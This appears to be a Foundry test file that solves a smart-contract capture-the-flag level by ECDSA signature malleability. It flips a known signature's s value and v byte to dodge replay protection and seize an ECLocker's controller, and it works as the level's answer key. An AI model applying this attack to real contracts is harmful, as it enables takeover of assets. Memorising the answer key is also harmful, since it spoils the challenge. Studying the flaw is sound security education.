// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

import "forge-std/Test.sol";
import "../Utils.sol";

interface IImpersonator {
  function lockers(uint256) external returns (address);
}

interface IECLocker {
  function controller() external returns (address);
  function changeController(uint8 v, bytes32 r, bytes32 s, address newController) external;
}

contract ImpersonatorTest is Test {
  // secp256k1 order
  uint256 private constant SECP256K1_N = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141;
  address private challengeAddress;

  function setUp() public {
    challengeAddress = utils.createLevelInstance(0x465f1E2c7FFDe5452CFe92aC3aa1230B76B2B1CB);
  }

  // This test shows that flipping `s` (and adjusting `v`) yields a different signature hash,
  // but the same recovered address.
  function testVulnerability() public pure {
    // This lock ID comes from the challenge factory
    uint256 lockId = 1336;

    // Compute the Ethereum signed message hash as used in ECLocker:
    // keccak256("\x19Ethereum Signed Message:\n32" + lockId)
    bytes32 msgHash;
    assembly {
      mstore(0x00, "\x19Ethereum Signed Message:\n32") // 28 bytes
      mstore(0x1C, lockId) // 32 bytes
      msgHash := keccak256(0x00, 0x3c) //28 + 32 = 60 bytes
    }

    // Factory values for the signature
    bytes32 r = bytes32(uint256(11397568185806560130291530949248708355673262872727946990834312389557386886033));
    bytes32 s = bytes32(uint256(54405834204020870944342294544757609285398723182661749830189277079337680158706));
    uint8 v = 27;

    // These are the elements of `_isValidSignature()` that we care about
    address recoveredAddressA = ecrecover(msgHash, v, r, s);
    bytes32 signatureHashA = keccak256(abi.encode([uint256(r), uint256(s), uint256(v)]));

    // Flip the `s` value and modify `v` accordingly.
    r = bytes32(uint256(11397568185806560130291530949248708355673262872727946990834312389557386886033));
    s = bytes32(SECP256K1_N - uint256(s));
    v = 28;

    // Perform the relevant instructions of `_isValidSignature()`
    address recoveredAddressB = ecrecover(msgHash, v, r, s);
    bytes32 signatureHashB = keccak256(abi.encode([uint256(r), uint256(s), uint256(v)]));

    // Compare results
    assertEq(recoveredAddressA, recoveredAddressB);
    assertNotEq(signatureHashA, signatureHashB);
  }

  function testExploit() public {
    // In this challenge, we can change the lock's controller if we supply a valid signature
    // whose (r, s, v) tuple has not been used before.
    //
    // Signature Malleability Attack:
    // The vulnerability is that the contract does not enforce that `s` is in the lower half of the curve order,
    // as required by EIP-2. This allows us to "flip" the `s` value (and adjust `v` accordingly) to create
    // an alternative valid signature that bypasses the replay protection.

    // value `r` (from the factory signature)
    bytes32 r = bytes32(uint256(11397568185806560130291530949248708355673262872727946990834312389557386886033));
    // value `s` (from the factory and flipped)
    bytes32 s = bytes32(SECP256K1_N - uint256(54405834204020870944342294544757609285398723182661749830189277079337680158706));
    // value `v` (modified from 27 -> 28)
    uint8 v = 28;

    // Get the initial value
    address lockerAddress = IImpersonator(challengeAddress).lockers(0);
    assertEq(IECLocker(lockerAddress).controller(), 0x42069d82D9592991704e6E41BF2589a76eAd1A91);

    // Execute the attack
    IECLocker(lockerAddress).changeController(v, r, s, address(0));

    // Check the new controller value
    assertEq(IECLocker(lockerAddress).controller(), address(0));

    // Submit the solution
    utils.submitLevelInstance(challengeAddress);
  }
}
